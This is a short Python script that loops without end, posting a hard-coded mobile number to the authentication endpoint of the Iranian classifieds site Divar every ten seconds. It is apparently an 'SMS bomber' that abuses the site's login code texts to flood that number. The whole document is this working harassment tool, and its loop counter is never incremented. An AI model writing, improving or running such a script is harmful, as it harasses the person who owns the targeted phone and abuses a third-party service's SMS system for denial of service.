import requests
import time
def sms(number):
    url = "https://api.divar.ir/v5/auth/authenticate"
    hedears = {"Content-Type": "application/json"}
    data = {"phone":number , "message": "Hello , how are you today?"}

    try:
        response=requests.post(url=url , headers=hedears , json=data , timeout=1)
        response.raise_for_status()
        print(f"Response status code: {response.status_code}")
    except requests.exceptions.RequestException as err:
        print(f"An error occurred: {err}")

i=1
while i<10:
    sms('09017413406')
    time.sleep(10)
